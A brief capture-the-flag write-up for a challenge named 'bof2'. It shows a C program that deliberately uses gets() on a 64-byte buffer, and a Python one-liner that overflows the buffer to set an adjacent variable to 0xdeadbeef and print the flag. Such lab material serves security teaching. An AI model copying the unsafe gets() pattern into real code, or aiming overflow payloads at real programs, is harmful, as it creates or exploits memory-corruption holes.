# bof2

The challenge asks if you can change variables.
Now we need to set winner to some exact value to get the flag. Let's look at the code

```c
#include <stdio.h>
#include <stdlib.h>

#define BUF_SIZE (64)

void main()
{
    int winner = 0;
    char buf[BUF_SIZE];

    gets(buf);

    if (winner == 0xdeadbeef) {  
        system("cat flag.txt");
    }
}
```

Okay, looks very similar to the first challenge.

*Remember, in memory we use little endian, meaning we are writing backwards

```bash
python -c "print 'A'*64 + '\xef\xbe\xad\xde'" | ./bof2
```

